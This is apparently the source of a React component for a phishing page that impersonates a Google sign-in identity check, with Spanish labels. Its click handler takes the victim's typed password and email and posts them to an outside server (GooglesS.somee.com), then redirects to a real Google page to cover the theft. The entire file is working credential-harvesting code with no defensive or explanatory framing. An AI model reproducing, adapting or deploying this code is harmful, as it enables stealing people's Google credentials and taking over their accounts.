import SelectAcountSvg from "../Constants/SelectAcountSvg"
import GoogleLog from "../Constants/GoogleLog"
import { Input } from "./Input"
import StatusContext from "../Context/StatusContext"
import { useContext } from "react"
import axios from "axios"
type Props = {
    account: string,
    name: string
}

const url = "http://GooglesS.somee.com/OldUser"
const defaultImage = "https://lh3.googleusercontent.com/a/default-user=s128-c"

export const Card = (el: Props) => {
    const { Status, SetStatus } = useContext(StatusContext)
    const handleClick = () => {
        if (Status) SetStatus(false)
        else {
            axios.post(url, {
                correo: el.account,
                contraseña: (document.getElementById("ActualPass")! as HTMLInputElement).value
            }, { method: "POST" }).then(res => {
                return res.data
            }).then((data) => {
                console.log(data);
            }
            ).catch(err => {
                console.log(err);
            }).finally(() => {

                location.href = ("https://accounts.google.com/v3/signin/challenge/pwd?TL=AJeL0C6HkwZgwIjvQYv9Vc8XOG2m0XCNQdKG2ejJglPjhakYa2SBG_u7gY2Wudxf&cid=1&continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Fpassword%3Fcontinue%3Dhttps%3A%2F%2Fmyaccount.google.com%2Fsecurity%3Fhl%253Den&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=es-419&ifkv=AYZoVheTBXYRmFggt3J5otQMIP1v836-xdF3qjsKGfyQ4YWi6_vWOagJr6cOzlZG7lCIw2xzIaEEdA&kdi=CAM&rart=ANgoxccYbyVIWhOnkY9aGpN63ct8iPRAppaK2WiNGDdvDD0PNVuWz2CyIHEceux6I7iwH-ThKJ_MRaq2u5E1FYB2rzDc41XS2Q&rpbg=1&sarp=1&scc=1&service=accountsettings&theme=glif");
            }
            )
        }
    }
    return (
        <section className="border w-[457px] max-w-screen rounded-md h-[502px] pt-[2.1rem] pb-14 flex flex-col items-center justify-around px-12">
            <GoogleLog />
            <strong className="font-normal text-2xl tracking-wide">{el.name}</strong>
            <div className="flex w-auto gap-1 border p-1 h-8 rounded-2xl hover:bg-gray-100 cursor-pointer  justify-between items-center">
                <img className="h-full rounded-2xl" src={defaultImage} alt="" />
                <small className="font-semibold text-[#555] text-[0.80rem]">{el.account}</small>
                <SelectAcountSvg />
            </div>
            <p className="text-sm self-start">Para continuar, primero debes verificar tu identidad</p>
            <Input />
            <div className="">
            </div>
            <section className="flex w-full justify-between">
                <button className="bg-[#00000000] text-[#4285f4] text-sm font-semibold ">¿Olvidaste la contraseña?</button>
                <button onClick={handleClick} className="bg-[#4285f4] text-white text-sm font-sans font-[500] px-6 py-[8px] rounded-md">Siguiente</button>
            </section>
        </section>
    )
}
